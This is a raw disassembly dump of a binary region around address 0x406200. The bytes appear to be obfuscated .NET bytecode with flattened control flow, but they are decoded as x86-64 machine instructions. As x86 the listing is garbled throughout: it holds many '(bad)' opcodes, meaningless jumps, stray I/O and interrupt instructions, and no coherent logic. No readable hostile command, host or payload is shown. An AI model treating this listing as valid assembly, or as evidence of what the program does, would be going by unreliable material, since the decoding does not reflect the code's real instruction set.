  406207:	00 20                	add    %ah,(%rax)
  406209:	0d 00 00 00 fe       	or     $0xfe000000,%eax
  40620e:	0e                   	(bad)
  40620f:	33 00                	xor    (%rax),%eax
  406211:	38 b5 09 00 00 39    	cmp    %dh,0x39000009(%rbp)
  406217:	65 d2 ff             	gs sar %cl,%bh
  40621a:	ff                   	(bad)
  40621b:	fe 0c 27             	decb   (%rdi,%riz,1)
  40621e:	00 20                	add    %ah,(%rax)
  406220:	15 00 00 00 fe       	adc    $0xfe000000,%eax
  406225:	0c 0c                	or     $0xc,%al
  406227:	00 9c 20 94 00 00 00 	add    %bl,0x94(%rax,%riz,1)
  40622e:	fe 0e                	decb   (%rsi)
  406230:	33 00                	xor    (%rax),%eax
  406232:	38 49 d2             	cmp    %cl,-0x2e(%rcx)
  406235:	ff                   	(bad)
  406236:	ff 20                	jmp    *(%rax)
  406238:	be 00 00 00 20       	mov    $0x20000000,%esi
  40623d:	3f                   	(bad)
  40623e:	00 00                	add    %al,(%rax)
  406240:	00 59 fe             	add    %bl,-0x2(%rcx)
  406243:	0e                   	(bad)
  406244:	0c 00                	or     $0x0,%al
  406246:	20 a5 01 00 00 fe    	and    %ah,-0x1ffffff(%rbp)
  40624c:	0e                   	(bad)
  40624d:	33 00                	xor    (%rax),%eax
  40624f:	38 2c d2             	cmp    %ch,(%rdx,%rdx,8)
  406252:	ff                   	(bad)
  406253:	ff 20                	jmp    *(%rax)
  406255:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  406258:	00 20                	add    %ah,(%rax)
  40625a:	52                   	push   %rdx
  40625b:	00 00                	add    %al,(%rax)
  40625d:	00 58 fe             	add    %bl,-0x2(%rax)
  406260:	0e                   	(bad)
  406261:	0c 00                	or     $0x0,%al
  406263:	20 93 01 00 00 38    	and    %dl,0x38000001(%rbx)
  406269:	17                   	(bad)
  40626a:	d2 ff                	sar    %cl,%bh
  40626c:	ff 20                	jmp    *(%rax)
  40626e:	74 00                	je     0x406270
  406270:	00 00                	add    %al,(%rax)
  406272:	20 72 00             	and    %dh,0x0(%rdx)
  406275:	00 00                	add    %al,(%rax)
  406277:	58                   	pop    %rax
  406278:	fe 0e                	decb   (%rsi)
  40627a:	2b 00                	sub    (%rax),%eax
  40627c:	20 3f                	and    %bh,(%rdi)
  40627e:	00 00                	add    %al,(%rax)
  406280:	00 fe                	add    %bh,%dh
  406282:	0e                   	(bad)
  406283:	33 00                	xor    (%rax),%eax
  406285:	38 4b 09             	cmp    %cl,0x9(%rbx)
  406288:	00 00                	add    %al,(%rax)
  40628a:	39 12                	cmp    %edx,(%rdx)
  40628c:	01 00                	add    %eax,(%rax)
  40628e:	00 38                	add    %bh,(%rax)
  406290:	ec                   	in     (%dx),%al
  406291:	d1 ff                	sar    $1,%edi
  406293:	ff 16                	call   *(%rsi)
  406295:	13 0e                	adc    (%rsi),%ecx
  406297:	20 86 00 00 00 38    	and    %al,0x38000000(%rsi)
  40629d:	e3 d1                	jrcxz  0x406270
  40629f:	ff                   	(bad)
  4062a0:	ff 20                	jmp    *(%rax)
  4062a2:	21 00                	and    %eax,(%rax)
  4062a4:	00 00                	add    %al,(%rax)
  4062a6:	20 53 00             	and    %dl,0x0(%rbx)
  4062a9:	00 00                	add    %al,(%rax)
  4062ab:	58                   	pop    %rax
  4062ac:	fe 0e                	decb   (%rsi)
  4062ae:	2b 00                	sub    (%rax),%eax
  4062b0:	20 df                	and    %bl,%bh
  4062b2:	00 00                	add    %al,(%rax)
  4062b4:	00 38                	add    %bh,(%rax)
  4062b6:	ca d1 ff             	lret   $0xffd1
  4062b9:	ff 11                	call   *(%rcx)
  4062bb:	07                   	(bad)
  4062bc:	38 1e                	cmp    %bl,(%rsi)
  4062be:	09 00                	or     %eax,(%rax)
  4062c0:	00 20                	add    %ah,(%rax)
  4062c2:	f8                   	clc
  4062c3:	00 00                	add    %al,(%rax)
  4062c5:	00 fe                	add    %bh,%dh
  4062c7:	0e                   	(bad)
  4062c8:	33 00                	xor    (%rax),%eax
  4062ca:	38 b1 d1 ff ff fe    	cmp    %dh,-0x100002f(%rcx)
  4062d0:	0c 27                	or     $0x27,%al
  4062d2:	00 20                	add    %ah,(%rax)
  4062d4:	18 00                	sbb    %al,(%rax)
  4062d6:	00 00                	add    %al,(%rax)
  4062d8:	20 30                	and    %dh,(%rax)
  4062da:	00 00                	add    %al,(%rax)
  4062dc:	00 20                	add    %ah,(%rax)
  4062de:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  4062e1:	00 58 9c             	add    %bl,-0x64(%rax)
  4062e4:	20 aa 01 00 00 38    	and    %ch,0x38000001(%rdx)
  4062ea:	8e d1                	mov    %ecx,%ss
  4062ec:	ff                   	(bad)
  4062ed:	ff 11                	call   *(%rcx)
  4062ef:	14 13                	adc    $0x13,%al
  4062f1:	09 20                	or     %esp,(%rax)
  4062f3:	93                   	xchg   %eax,%ebx
  4062f4:	00 00                	add    %al,(%rax)
  4062f6:	00 fe                	add    %bh,%dh
  4062f8:	0e                   	(bad)
  4062f9:	33 00                	xor    (%rax),%eax
  4062fb:	16                   	(bad)
  4062fc:	39 7f d1             	cmp    %edi,-0x2f(%rdi)
  4062ff:	ff                   	(bad)
  406300:	ff 20                	jmp    *(%rax)
  406302:	f7 00 00 00 20 52    	testl  $0x52200000,(%rax)
  406308:	00 00                	add    %al,(%rax)
  40630a:	00 59 fe             	add    %bl,-0x2(%rcx)
  40630d:	0e                   	(bad)
  40630e:	2b 00                	sub    (%rax),%eax
  406310:	20 80 01 00 00 38    	and    %al,0x38000001(%rax)
  406316:	6a d1                	push   $0xffffffffffffffd1
  406318:	ff                   	(bad)
  406319:	ff                   	(bad)
  40631a:	fe 0c 27             	decb   (%rdi,%riz,1)
  40631d:	00 20                	add    %ah,(%rax)
  40631f:	06                   	(bad)
  406320:	00 00                	add    %al,(%rax)
  406322:	00 fe                	add    %bh,%dh
  406324:	0c 0c                	or     $0xc,%al
  406326:	00 9c 20 18 00 00 00 	add    %bl,0x18(%rax,%riz,1)
  40632d:	fe 0e                	decb   (%rsi)
  40632f:	33 00                	xor    (%rax),%eax
  406331:	16                   	(bad)
  406332:	39 49 d1             	cmp    %ecx,-0x2f(%rcx)
  406335:	ff                   	(bad)
  406336:	ff                   	(bad)
  406337:	fe 0c 27             	decb   (%rdi,%riz,1)
  40633a:	00 20                	add    %ah,(%rax)
  40633c:	0f 00 00             	sldt   (%rax)
  40633f:	00 fe                	add    %bh,%dh
  406341:	0c 0c                	or     $0xc,%al
  406343:	00 9c 20 bb 00 00 00 	add    %bl,0xbb(%rax,%riz,1)
  40634a:	38 2d d1 ff ff fe    	cmp    %ch,-0x100002f(%rip)        # 0xffffffffff406321
  406350:	0c 2f                	or     $0x2f,%al
  406352:	00 20                	add    %ah,(%rax)
  406354:	00 00                	add    %al,(%rax)
  406356:	00 00                	add    %al,(%rax)
  406358:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  40635b:	00 9c 20 75 00 00 00 	add    %bl,0x75(%rax,%riz,1)
  406362:	fe 0e                	decb   (%rsi)
  406364:	33 00                	xor    (%rax),%eax
  406366:	17                   	(bad)
  406367:	3a 14 d1             	cmp    (%rcx,%rdx,8),%dl
  40636a:	ff                   	(bad)
  40636b:	ff                   	(bad)
  40636c:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40636f:	00 20                	add    %ah,(%rax)
  406371:	0f 00 00             	sldt   (%rax)
  406374:	00 fe                	add    %bh,%dh
  406376:	0c 1e                	or     $0x1e,%al
  406378:	00 9c 20 46 00 00 00 	add    %bl,0x46(%rax,%riz,1)
  40637f:	38 00                	cmp    %al,(%rax)
  406381:	d1 ff                	sar    $1,%edi
  406383:	ff 20                	jmp    *(%rax)
  406385:	bc 00 00 00 20       	mov    $0x20000000,%esp
  40638a:	1d 00 00 00 58       	sbb    $0x58000000,%eax
  40638f:	fe 0e                	decb   (%rsi)
  406391:	0b 00                	or     (%rax),%eax
  406393:	20 67 00             	and    %ah,0x0(%rdi)
  406396:	00 00                	add    %al,(%rax)
  406398:	fe 0e                	decb   (%rsi)
  40639a:	33 00                	xor    (%rax),%eax
  40639c:	38 df                	cmp    %bl,%bh
  40639e:	d0 ff                	sar    $1,%bh
  4063a0:	ff                   	(bad)
  4063a1:	fe 0c 27             	decb   (%rdi,%riz,1)
  4063a4:	00 20                	add    %ah,(%rax)
  4063a6:	1f                   	(bad)
  4063a7:	00 00                	add    %al,(%rax)
  4063a9:	00 20                	add    %ah,(%rax)
  4063ab:	8b 00                	mov    (%rax),%eax
  4063ad:	00 00                	add    %al,(%rax)
  4063af:	20 2e                	and    %ch,(%rsi)
  4063b1:	00 00                	add    %al,(%rax)
  4063b3:	00 59 9c             	add    %bl,-0x64(%rcx)
  4063b6:	20 4d 00             	and    %cl,0x0(%rbp)
  4063b9:	00 00                	add    %al,(%rax)
  4063bb:	fe 0e                	decb   (%rsi)
  4063bd:	33 00                	xor    (%rax),%eax
  4063bf:	38 bc d0 ff ff fe 0c 	cmp    %bh,0xcfeffff(%rax,%rdx,8)
  4063c6:	2f                   	(bad)
  4063c7:	00 20                	add    %ah,(%rax)
  4063c9:	03 00                	add    (%rax),%eax
  4063cb:	00 00                	add    %al,(%rax)
  4063cd:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  4063d0:	00 9c 20 41 01 00 00 	add    %bl,0x141(%rax,%riz,1)
  4063d7:	fe 0e                	decb   (%rsi)
  4063d9:	33 00                	xor    (%rax),%eax
  4063db:	38 a0 d0 ff ff fe    	cmp    %ah,-0x1000030(%rax)
  4063e1:	0c 27                	or     $0x27,%al
  4063e3:	00 20                	add    %ah,(%rax)
  4063e5:	10 00                	adc    %al,(%rax)
  4063e7:	00 00                	add    %al,(%rax)
  4063e9:	20 93 00 00 00 20    	and    %dl,0x20000000(%rbx)
  4063ef:	31 00                	xor    %eax,(%rax)
  4063f1:	00 00                	add    %al,(%rax)
  4063f3:	59                   	pop    %rcx
  4063f4:	9c                   	pushf
  4063f5:	20 9a 01 00 00 38    	and    %bl,0x38000001(%rdx)
  4063fb:	85 d0                	test   %edx,%eax
  4063fd:	ff                   	(bad)
  4063fe:	ff 20                	jmp    *(%rax)
  406400:	24 00                	and    $0x0,%al
  406402:	00 00                	add    %al,(%rax)
  406404:	20 22                	and    %ah,(%rdx)
  406406:	00 00                	add    %al,(%rax)
  406408:	00 58 fe             	add    %bl,-0x2(%rax)
  40640b:	0e                   	(bad)
  40640c:	2b 00                	sub    (%rax),%eax
  40640e:	20 61 00             	and    %ah,0x0(%rcx)
  406411:	00 00                	add    %al,(%rax)
  406413:	38 6c d0 ff          	cmp    %ch,-0x1(%rax,%rdx,8)
  406417:	ff                   	(bad)
  406418:	fe 0c 27             	decb   (%rdi,%riz,1)
  40641b:	00 20                	add    %ah,(%rax)
  40641d:	0c 00                	or     $0x0,%al
  40641f:	00 00                	add    %al,(%rax)
  406421:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  406424:	00 9c 20 2d 00 00 00 	add    %bl,0x2d(%rax,%riz,1)
  40642b:	38 54 d0 ff          	cmp    %dl,-0x1(%rax,%rdx,8)
  40642f:	ff 20                	jmp    *(%rax)
  406431:	25 00 00 00 20       	and    $0x20000000,%eax
  406436:	0e                   	(bad)
  406437:	00 00                	add    %al,(%rax)
  406439:	00 58 fe             	add    %bl,-0x2(%rax)
  40643c:	0e                   	(bad)
  40643d:	0c 00                	or     $0x0,%al
  40643f:	20 f6                	and    %dh,%dh
  406441:	00 00                	add    %al,(%rax)
  406443:	00 fe                	add    %bh,%dh
  406445:	0e                   	(bad)
  406446:	33 00                	xor    (%rax),%eax
  406448:	38 33                	cmp    %dh,(%rbx)
  40644a:	d0 ff                	sar    $1,%bh
  40644c:	ff 20                	jmp    *(%rax)
  40644e:	10 00                	adc    %al,(%rax)
  406450:	00 00                	add    %al,(%rax)
  406452:	8d 11                	lea    (%rcx),%edx
  406454:	00 00                	add    %al,(%rax)
  406456:	01 fe                	add    %edi,%esi
  406458:	0e                   	(bad)
  406459:	2f                   	(bad)
  40645a:	00 20                	add    %ah,(%rax)
  40645c:	da 00                	fiaddl (%rax)
  40645e:	00 00                	add    %al,(%rax)
  406460:	38 17                	cmp    %dl,(%rdi)
  406462:	d0 ff                	sar    $1,%bh
  406464:	ff                   	(bad)
  406465:	fe 0c 27             	decb   (%rdi,%riz,1)
  406468:	00 13                	add    %dl,(%rbx)
  40646a:	18 20                	sbb    %ah,(%rax)
  40646c:	47 00 00             	rex.RXB add %r8b,(%r8)
  40646f:	00 38                	add    %bh,(%rax)
  406471:	07                   	(bad)
  406472:	d0 ff                	sar    $1,%bh
  406474:	ff                   	(bad)
  406475:	fe 0c 27             	decb   (%rdi,%riz,1)
  406478:	00 20                	add    %ah,(%rax)
  40647a:	11 00                	adc    %eax,(%rax)
  40647c:	00 00                	add    %al,(%rax)
  40647e:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  406481:	00 9c 20 ef 00 00 00 	add    %bl,0xef(%rax,%riz,1)
  406488:	fe 0e                	decb   (%rsi)
  40648a:	33 00                	xor    (%rax),%eax
  40648c:	38 ef                	cmp    %ch,%bh
  40648e:	cf                   	iret
  40648f:	ff                   	(bad)
  406490:	ff                   	(bad)
  406491:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  406494:	00 20                	add    %ah,(%rax)
  406496:	03 00                	add    (%rax),%eax
  406498:	00 00                	add    %al,(%rax)
  40649a:	20 80 00 00 00 20    	and    %al,0x20000000(%rax)
  4064a0:	2a 00                	sub    (%rax),%al
  4064a2:	00 00                	add    %al,(%rax)
  4064a4:	59                   	pop    %rcx
  4064a5:	9c                   	pushf
  4064a6:	20 a3 00 00 00 38    	and    %ah,0x38000000(%rbx)
  4064ac:	d4                   	(bad)
  4064ad:	cf                   	iret
  4064ae:	ff                   	(bad)
  4064af:	ff                   	(bad)
  4064b0:	fe 0c 27             	decb   (%rdi,%riz,1)
  4064b3:	00 20                	add    %ah,(%rax)
  4064b5:	08 00                	or     %al,(%rax)
  4064b7:	00 00                	add    %al,(%rax)
  4064b9:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4064bc:	00 9c 20 a9 01 00 00 	add    %bl,0x1a9(%rax,%riz,1)
  4064c3:	fe 0e                	decb   (%rsi)
  4064c5:	33 00                	xor    (%rax),%eax
  4064c7:	17                   	(bad)
  4064c8:	3a b3 cf ff ff fe    	cmp    -0x1000031(%rbx),%dh
  4064ce:	0c 2f                	or     $0x2f,%al
  4064d0:	00 20                	add    %ah,(%rax)
  4064d2:	0c 00                	or     $0x0,%al
  4064d4:	00 00                	add    %al,(%rax)
  4064d6:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  4064d9:	00 9c 20 2c 00 00 00 	add    %bl,0x2c(%rax,%riz,1)
  4064e0:	38 97 cf ff ff fe    	cmp    %dl,-0x1000031(%rdi)
  4064e6:	0c 27                	or     $0x27,%al
  4064e8:	00 20                	add    %ah,(%rax)
  4064ea:	06                   	(bad)
  4064eb:	00 00                	add    %al,(%rax)
  4064ed:	00 20                	add    %ah,(%rax)
  4064ef:	21 00                	and    %eax,(%rax)
  4064f1:	00 00                	add    %al,(%rax)
  4064f3:	20 5c 00 00          	and    %bl,0x0(%rax,%rax,1)
  4064f7:	00 58 9c             	add    %bl,-0x64(%rax)
  4064fa:	20 90 01 00 00 fe    	and    %dl,-0x1ffffff(%rax)
  406500:	0e                   	(bad)
  406501:	33 00                	xor    (%rax),%eax
  406503:	38 e1                	cmp    %ah,%cl
  406505:	06                   	(bad)
  406506:	00 00                	add    %al,(%rax)
  406508:	39 5d dc             	cmp    %ebx,-0x24(%rbp)
  40650b:	ff                   	(bad)
  40650c:	ff                   	(bad)
  40650d:	38 6e cf             	cmp    %ch,-0x31(%rsi)
  406510:	ff                   	(bad)
  406511:	ff 02                	incl   (%rdx)
  406513:	15 40 59 ef ff       	adc    $0xffef5940,%eax
  406518:	ff 20                	jmp    *(%rax)
  40651a:	bd 00 00 00 fe       	mov    $0xfe000000,%ebp
  40651f:	0e                   	(bad)
  406520:	33 00                	xor    (%rax),%eax
  406522:	16                   	(bad)
  406523:	39 58 cf             	cmp    %ebx,-0x31(%rax)
  406526:	ff                   	(bad)
  406527:	ff 20                	jmp    *(%rax)
  406529:	df 00                	filds  (%rax)
  40652b:	00 00                	add    %al,(%rax)
  40652d:	20 4a 00             	and    %cl,0x0(%rdx)
  406530:	00 00                	add    %al,(%rax)
  406532:	59                   	pop    %rcx
  406533:	fe 0e                	decb   (%rsi)
  406535:	0c 00                	or     $0x0,%al
  406537:	20 69 01             	and    %ch,0x1(%rcx)
  40653a:	00 00                	add    %al,(%rax)
  40653c:	fe 0e                	decb   (%rsi)
  40653e:	33 00                	xor    (%rax),%eax
  406540:	16                   	(bad)
  406541:	39 3a                	cmp    %edi,(%rdx)
  406543:	cf                   	iret
  406544:	ff                   	(bad)
  406545:	ff 20                	jmp    *(%rax)
  406547:	e7 00                	out    %eax,$0x0
  406549:	00 00                	add    %al,(%rax)
  40654b:	20 4d 00             	and    %cl,0x0(%rbp)
  40654e:	00 00                	add    %al,(%rax)
  406550:	59                   	pop    %rcx
  406551:	fe 0e                	decb   (%rsi)
  406553:	0c 00                	or     $0x0,%al
  406555:	20 69 00             	and    %ch,0x0(%rcx)
  406558:	00 00                	add    %al,(%rax)
  40655a:	38 1d cf ff ff fe    	cmp    %bl,-0x1000031(%rip)        # 0xffffffffff40652f
  406560:	0c 27                	or     $0x27,%al
  406562:	00 20                	add    %ah,(%rax)
  406564:	0f 00 00             	sldt   (%rax)
  406567:	00 fe                	add    %bh,%dh
  406569:	0c 0c                	or     $0xc,%al
  40656b:	00 9c 20 4c 00 00 00 	add    %bl,0x4c(%rax,%riz,1)
  406572:	38 0d cf ff ff fe    	cmp    %cl,-0x1000031(%rip)        # 0xffffffffff406547
  406578:	0c 27                	or     $0x27,%al
  40657a:	00 20                	add    %ah,(%rax)
  40657c:	0d 00 00 00 20       	or     $0x20000000,%eax
  406581:	72 00                	jb     0x406583
  406583:	00 00                	add    %al,(%rax)
  406585:	20 22                	and    %ah,(%rdx)
  406587:	00 00                	add    %al,(%rax)
  406589:	00 58 9c             	add    %bl,-0x64(%rax)
  40658c:	20 1b                	and    %bl,(%rbx)
  40658e:	01 00                	add    %eax,(%rax)
  406590:	00 38                	add    %bh,(%rax)
  406592:	ee                   	out    %al,(%dx)
  406593:	ce                   	(bad)
  406594:	ff                   	(bad)
  406595:	ff                   	(bad)
  406596:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  406599:	00 20                	add    %ah,(%rax)
  40659b:	0c 00                	or     $0x0,%al
  40659d:	00 00                	add    %al,(%rax)
  40659f:	20 d6                	and    %dl,%dh
  4065a1:	00 00                	add    %al,(%rax)
  4065a3:	00 20                	add    %ah,(%rax)
  4065a5:	47 00 00             	rex.RXB add %r8b,(%r8)
  4065a8:	00 59 9c             	add    %bl,-0x64(%rcx)
  4065ab:	20 7f 00             	and    %bh,0x0(%rdi)
  4065ae:	00 00                	add    %al,(%rax)
  4065b0:	38 cf                	cmp    %cl,%bh
  4065b2:	ce                   	(bad)
  4065b3:	ff                   	(bad)
  4065b4:	ff                   	(bad)
  4065b5:	fe 0c 27             	decb   (%rdi,%riz,1)
  4065b8:	00 20                	add    %ah,(%rax)
  4065ba:	04 00                	add    $0x0,%al
  4065bc:	00 00                	add    %al,(%rax)
  4065be:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4065c1:	00 9c 20 67 01 00 00 	add    %bl,0x167(%rax,%riz,1)
  4065c8:	38 af ce ff ff 16    	cmp    %ch,0x16ffffce(%rdi)
  4065ce:	13 16                	adc    (%rsi),%edx
  4065d0:	20 a5 00 00 00 38    	and    %ah,0x38000000(%rbp)
  4065d6:	a2 ce ff ff 11 08 11 	movabs %al,0x1814110811ffffce
  4065dd:	14 18 
  4065df:	58                   	pop    %rax
  4065e0:	11 05 20 00 00 ff    	adc    %eax,-0xffffe0(%rip)        # 0xffffffffff406606
  4065e6:	00 5f 1f             	add    %bl,0x1f(%rdi)
  4065e9:	10 64 d2 9c          	adc    %ah,-0x64(%rdx,%rdx,8)
  4065ed:	20 9f 00 00 00 fe    	and    %bl,-0x2000000(%rdi)
  4065f3:	0e                   	(bad)
  4065f4:	33 00                	xor    (%rax),%eax
  4065f6:	38 f8                	cmp    %bh,%al
  4065f8:	05 00 00 3a 5f       	add    $0x5f3a0000,%eax
  4065fd:	de ff                	fdivrp %st,%st(7)
  4065ff:	ff                   	(bad)
  406600:	38 7b ce             	cmp    %bh,-0x32(%rbx)
  406603:	ff                   	(bad)
  406604:	ff 20                	jmp    *(%rax)
  406606:	e8 00 00 00 20       	call   0x2040660b
  40660b:	4d 00 00             	rex.WRB add %r8b,(%r8)
  40660e:	00 59 fe             	add    %bl,-0x2(%rcx)
  406611:	0e                   	(bad)
  406612:	2b 00                	sub    (%rax),%eax
  406614:	20 66 01             	and    %ah,0x1(%rsi)
  406617:	00 00                	add    %al,(%rax)
  406619:	38 5e ce             	cmp    %bl,-0x32(%rsi)
  40661c:	ff                   	(bad)
  40661d:	ff 20                	jmp    *(%rax)
  40661f:	5c                   	pop    %rsp
  406620:	00 00                	add    %al,(%rax)
  406622:	00 20                	add    %ah,(%rax)
  406624:	4d 00 00             	rex.WRB add %r8b,(%r8)
  406627:	00 58 fe             	add    %bl,-0x2(%rax)
  40662a:	0e                   	(bad)
  40662b:	0b 00                	or     (%rax),%eax
  40662d:	20 70 00             	and    %dh,0x0(%rax)
  406630:	00 00                	add    %al,(%rax)
  406632:	fe 0e                	decb   (%rsi)
  406634:	33 00                	xor    (%rax),%eax
  406636:	38 45 ce             	cmp    %al,-0x32(%rbp)
  406639:	ff                   	(bad)
  40663a:	ff 20                	jmp    *(%rax)
  40663c:	f3 00 00             	repz add %al,(%rax)
  40663f:	00 20                	add    %ah,(%rax)
  406641:	51                   	push   %rcx
  406642:	00 00                	add    %al,(%rax)
  406644:	00 59 fe             	add    %bl,-0x2(%rcx)
  406647:	0e                   	(bad)
  406648:	1e                   	(bad)
  406649:	00 20                	add    %ah,(%rax)
  40664b:	fd                   	std
  40664c:	00 00                	add    %al,(%rax)
  40664e:	00 38                	add    %bh,(%rax)
  406650:	30 ce                	xor    %cl,%dh
  406652:	ff                   	(bad)
  406653:	ff                   	(bad)
  406654:	fe 0c 27             	decb   (%rdi,%riz,1)
  406657:	00 20                	add    %ah,(%rax)
  406659:	07                   	(bad)
  40665a:	00 00                	add    %al,(%rax)
  40665c:	00 20                	add    %ah,(%rax)
  40665e:	30 00                	xor    %al,(%rax)
  406660:	00 00                	add    %al,(%rax)
  406662:	20 4f 00             	and    %cl,0x0(%rdi)
  406665:	00 00                	add    %al,(%rax)
  406667:	58                   	pop    %rax
  406668:	9c                   	pushf
  406669:	20 c9                	and    %cl,%cl
  40666b:	00 00                	add    %al,(%rax)
  40666d:	00 38                	add    %bh,(%rax)
  40666f:	11 ce                	adc    %ecx,%esi
  406671:	ff                   	(bad)
  406672:	ff                   	(bad)
  406673:	fe 0c 27             	decb   (%rdi,%riz,1)
  406676:	00 20                	add    %ah,(%rax)
  406678:	05 00 00 00 20       	add    $0x20000000,%eax
  40667d:	de 00                	fiadds (%rax)
  40667f:	00 00                	add    %al,(%rax)
  406681:	20 4a 00             	and    %cl,0x0(%rdx)
  406684:	00 00                	add    %al,(%rax)
  406686:	59                   	pop    %rcx
  406687:	9c                   	pushf
  406688:	20 24 01             	and    %ah,(%rcx,%rax,1)
  40668b:	00 00                	add    %al,(%rax)
  40668d:	fe 0e                	decb   (%rsi)
  40668f:	33 00                	xor    (%rax),%eax
  406691:	38 67 05             	cmp    %ah,0x5(%rdi)
  406694:	00 00                	add    %al,(%rax)
  406696:	39 e5                	cmp    %esp,%ebp
  406698:	cd ff                	int    $0xff
  40669a:	ff                   	(bad)
  40669b:	fe 0c 27             	decb   (%rdi,%riz,1)
  40669e:	00 20                	add    %ah,(%rax)
  4066a0:	01 00                	add    %eax,(%rax)
  4066a2:	00 00                	add    %al,(%rax)
  4066a4:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4066a7:	00 9c 20 aa 00 00 00 	add    %bl,0xaa(%rax,%riz,1)
  4066ae:	38 d1                	cmp    %dl,%cl
  4066b0:	cd ff                	int    $0xff
  4066b2:	ff                   	(bad)
  4066b3:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4066b6:	00 20                	add    %ah,(%rax)
  4066b8:	09 00                	or     %eax,(%rax)
  4066ba:	00 00                	add    %al,(%rax)
  4066bc:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  4066bf:	00 9c 20 b6 00 00 00 	add    %bl,0xb6(%rax,%riz,1)
  4066c6:	38 b1 cd ff ff fe    	cmp    %dh,-0x1000033(%rcx)
  4066cc:	0c 2f                	or     $0x2f,%al
  4066ce:	00 20                	add    %ah,(%rax)
  4066d0:	06                   	(bad)
  4066d1:	00 00                	add    %al,(%rax)
  4066d3:	00 20                	add    %ah,(%rax)
  4066d5:	20 00                	and    %al,(%rax)
  4066d7:	00 00                	add    %al,(%rax)
  4066d9:	20 5e 00             	and    %bl,0x0(%rsi)
  4066dc:	00 00                	add    %al,(%rax)
  4066de:	58                   	pop    %rax
  4066df:	9c                   	pushf
  4066e0:	20 21                	and    %ah,(%rcx)
  4066e2:	00 00                	add    %al,(%rax)
  4066e4:	00 38                	add    %bh,(%rax)
  4066e6:	92                   	xchg   %eax,%edx
  4066e7:	cd ff                	int    $0xff
  4066e9:	ff 20                	jmp    *(%rax)
  4066eb:	04 00                	add    $0x0,%al
  4066ed:	00 00                	add    %al,(%rax)
  4066ef:	20 10                	and    %dl,(%rax)
  4066f1:	00 00                	add    %al,(%rax)
  4066f3:	00 58 fe             	add    %bl,-0x2(%rax)
  4066f6:	0e                   	(bad)
  4066f7:	2b 00                	sub    (%rax),%eax
  4066f9:	20 51 01             	and    %dl,0x1(%rcx)
  4066fc:	00 00                	add    %al,(%rax)
  4066fe:	38 81 cd ff ff fe    	cmp    %al,-0x1000033(%rcx)
  406704:	0c 2f                	or     $0x2f,%al
  406706:	00 20                	add    %ah,(%rax)
  406708:	07                   	(bad)
  406709:	00 00                	add    %al,(%rax)
  40670b:	00 20                	add    %ah,(%rax)
  40670d:	b4 00                	mov    $0x0,%ah
  40670f:	00 00                	add    %al,(%rax)
  406711:	20 3c 00             	and    %bh,(%rax,%rax,1)
  406714:	00 00                	add    %al,(%rax)
  406716:	59                   	pop    %rcx
  406717:	9c                   	pushf
  406718:	20 1a                	and    %bl,(%rdx)
  40671a:	00 00                	add    %al,(%rax)
  40671c:	00 38                	add    %bh,(%rax)
  40671e:	5a                   	pop    %rdx
  40671f:	cd ff                	int    $0xff
  406721:	ff 11                	call   *(%rcx)
  406723:	18 11                	sbb    %dl,(%rcx)
  406725:	09 19                	or     %ebx,(%rcx)
  406727:	58                   	pop    %rax
  406728:	e0 91                	loopne 0x4066bb
  40672a:	1f                   	(bad)
  40672b:	18 62 11             	sbb    %ah,0x11(%rdx)
  40672e:	18 11                	sbb    %dl,(%rcx)
  406730:	09 18                	or     %ebx,(%rax)
  406732:	58                   	pop    %rax
  406733:	e0 91                	loopne 0x4066c6
  406735:	1f                   	(bad)
  406736:	10 62 60             	adc    %ah,0x60(%rdx)
  406739:	11 18                	adc    %ebx,(%rax)
  40673b:	11 09                	adc    %ecx,(%rcx)
  40673d:	17                   	(bad)
  40673e:	58                   	pop    %rax
  40673f:	e0 91                	loopne 0x4066d2
  406741:	1e                   	(bad)
  406742:	62                   	(bad)
  406743:	60                   	(bad)
  406744:	11 18                	adc    %ebx,(%rax)
  406746:	11 09                	adc    %ecx,(%rcx)
  406748:	e0 91                	loopne 0x4066db
  40674a:	60                   	(bad)
  40674b:	13 1c 20             	adc    (%rax,%riz,1),%ebx
  40674e:	6c                   	insb   (%dx),(%rdi)
  40674f:	00 00                	add    %al,(%rax)
  406751:	00 fe                	add    %bh,%dh
  406753:	0e                   	(bad)
  406754:	33 00                	xor    (%rax),%eax
  406756:	38 25 cd ff ff 20    	cmp    %ah,0x20ffffcd(%rip)        # 0x21406729
  40675c:	82                   	(bad)
  40675d:	00 00                	add    %al,(%rax)
  40675f:	00 20                	add    %ah,(%rax)
  406761:	67 00 00             	add    %al,(%eax)
  406764:	00 59 fe             	add    %bl,-0x2(%rcx)
  406767:	0e                   	(bad)
  406768:	0b 00                	or     (%rax),%eax
  40676a:	20 8a 01 00 00 38    	and    %cl,0x38000001(%rdx)
  406770:	10 cd                	adc    %cl,%ch
  406772:	ff                   	(bad)
  406773:	ff                   	(bad)
  406774:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  406777:	00 13                	add    %dl,(%rbx)
  406779:	25 20 66 00 00       	and    $0x6620,%eax
  40677e:	00 fe                	add    %bh,%dh
  406780:	0e                   	(bad)
  406781:	33 00                	xor    (%rax),%eax
  406783:	38 f8                	cmp    %bh,%al
  406785:	cc                   	int3
  406786:	ff                   	(bad)
  406787:	ff                   	(bad)
  406788:	fe 0c 27             	decb   (%rdi,%riz,1)
  40678b:	00 20                	add    %ah,(%rax)
  40678d:	03 00                	add    (%rax),%eax
  40678f:	00 00                	add    %al,(%rax)
  406791:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  406794:	00 9c 20 b9 00 00 00 	add    %bl,0xb9(%rax,%riz,1)
  40679b:	38 dc                	cmp    %bl,%ah
  40679d:	cc                   	int3
  40679e:	ff                   	(bad)
  40679f:	ff 11                	call   *(%rcx)
  4067a1:	08 11                	or     %dl,(%rcx)
  4067a3:	14 11                	adc    $0x11,%al
  4067a5:	05 20 ff 00 00       	add    $0xff20,%eax
